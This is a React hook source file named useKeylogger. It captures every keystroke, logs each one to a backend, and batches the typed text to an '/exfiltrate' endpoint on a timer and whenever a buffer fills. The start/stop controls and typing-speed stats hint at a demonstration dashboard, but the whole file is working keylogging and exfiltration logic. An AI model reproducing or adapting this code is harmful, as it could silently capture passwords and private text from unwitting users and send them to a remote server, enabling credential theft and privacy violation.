import { useState, useEffect, useCallback, useRef } from 'react';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

export function useKeylogger(sessionId) {
  const [isActive, setIsActive] = useState(false);
  const [keystrokes, setKeystrokes] = useState([]);
  const [buffer, setBuffer] = useState([]);
  const [stats, setStats] = useState({
    totalKeys: 0,
    sessionDuration: 0,
    wpm: 0,
  });
  
  const startTimeRef = useRef(null);
  const bufferTimerRef = useRef(null);

  const BUFFER_SIZE = 50;
  const EXFILTRATION_INTERVAL = 30000; // 30 seconds

  const logKeystroke = useCallback(async (keystrokeData) => {
    try {
      await axios.post(`${API}/keystrokes`, {
        ...keystrokeData,
        session_id: sessionId,
      });
    } catch (error) {
      console.error('Failed to log keystroke:', error);
    }
  }, [sessionId]);

  const exfiltrateData = useCallback(async (data, method = 'web') => {
    try {
      const response = await axios.post(`${API}/exfiltrate`, {
        method,
        data,
        session_id: sessionId,
      });
      return response.data;
    } catch (error) {
      console.error('Exfiltration failed:', error);
      return null;
    }
  }, [sessionId]);

  const flushBuffer = useCallback(async () => {
    if (buffer.length > 0) {
      const dataToExfiltrate = buffer.map(k => k.key).join('');
      await exfiltrateData(dataToExfiltrate, 'web');
      setBuffer([]);
    }
  }, [buffer, exfiltrateData]);

  const handleKeyDown = useCallback((event) => {
    if (!isActive) return;

    const keystrokeData = {
      key: event.key,
      code: event.code,
      key_code: event.keyCode,
      modifiers: {
        shift: event.shiftKey,
        ctrl: event.ctrlKey,
        alt: event.altKey,
        meta: event.metaKey,
      },
    };

    // Add to local state
    const newKeystroke = {
      ...keystrokeData,
      timestamp: new Date().toISOString(),
      id: Date.now() + Math.random(),
    };

    setKeystrokes(prev => [newKeystroke, ...prev]);
    setBuffer(prev => [...prev, newKeystroke]);
    
    // Log to backend
    logKeystroke(keystrokeData);

    // Update stats
    setStats(prev => ({
      ...prev,
      totalKeys: prev.totalKeys + 1,
    }));
  }, [isActive, logKeystroke]);

  // Auto-flush buffer when it reaches size limit
  useEffect(() => {
    if (buffer.length >= BUFFER_SIZE) {
      flushBuffer();
    }
  }, [buffer, flushBuffer]);

  // Periodic exfiltration
  useEffect(() => {
    if (isActive) {
      bufferTimerRef.current = setInterval(() => {
        flushBuffer();
      }, EXFILTRATION_INTERVAL);
    } else {
      if (bufferTimerRef.current) {
        clearInterval(bufferTimerRef.current);
      }
    }

    return () => {
      if (bufferTimerRef.current) {
        clearInterval(bufferTimerRef.current);
      }
    };
  }, [isActive, flushBuffer]);

  // Update session duration
  useEffect(() => {
    if (isActive && !startTimeRef.current) {
      startTimeRef.current = Date.now();
    }

    if (isActive) {
      const interval = setInterval(() => {
        const duration = Math.floor((Date.now() - startTimeRef.current) / 1000);
        setStats(prev => {
          const minutes = duration / 60;
          const words = prev.totalKeys / 5; // Average 5 characters per word
          const wpm = minutes > 0 ? Math.round(words / minutes) : 0;
          
          return {
            ...prev,
            sessionDuration: duration,
            wpm,
          };
        });
      }, 1000);

      return () => clearInterval(interval);
    }
  }, [isActive]);

  const start = () => {
    setIsActive(true);
    startTimeRef.current = Date.now();
  };

  const stop = () => {
    setIsActive(false);
    flushBuffer();
  };

  const clear = async () => {
    try {
      await axios.delete(`${API}/keystrokes`, {
        params: { session_id: sessionId }
      });
      setKeystrokes([]);
      setBuffer([]);
      setStats({
        totalKeys: 0,
        sessionDuration: 0,
        wpm: 0,
      });
      startTimeRef.current = null;
    } catch (error) {
      console.error('Failed to clear keystrokes:', error);
    }
  };

  return {
    isActive,
    keystrokes,
    buffer,
    stats,
    start,
    stop,
    clear,
    handleKeyDown,
    exfiltrateData,
  };
}